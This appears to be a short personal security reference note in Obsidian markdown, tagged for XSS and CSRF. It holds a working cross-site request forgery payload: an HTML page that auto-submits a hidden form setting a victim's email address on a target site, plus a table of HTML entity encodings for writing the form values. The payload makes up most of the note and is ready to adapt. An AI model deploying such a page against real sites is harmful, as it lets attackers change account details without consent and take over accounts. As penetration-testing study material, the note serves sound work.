---
categories:
  - "[[Security]]"
type: Reference
domain: Web AppSec
topics:
  - "[[XSS]]"
  - "[[CSRF]]"
status: Complete
platform:
  - Web
severity:
cwe:
owasp:
tools: []
created:
updated: 2025-07-16
---


```HTML
<form method="POST" action="https://website.com/path/to/form">
	<input type="hidden" name="email" value="anything&#64;email&#46;net"> </form> 
<script> 
	document.forms[0].submit();
</script>
```

>[!alert] Form inputs need to use `HTML entity encoding`
>|Character|HTML Entity|Decimal Code|
>|---|---|---|
>|`&`|`&amp;`|`&#38;`|
>|`<`|`&lt;`|`&#60;`|
>|`>`|`&gt;`|`&#62;`|
>|`"`|`&quot;`|`&#34;`|
>|`'`|`&apos;`|`&#39;`|
>|`@`|`&#64;`|`&#64;`|
>|`.`|`&#46;`|`&#46;`|
>
>See also: https://symbl.cc/en/html-entities/

---
### Supporting Content:
- [[HTML Entity Coding]]




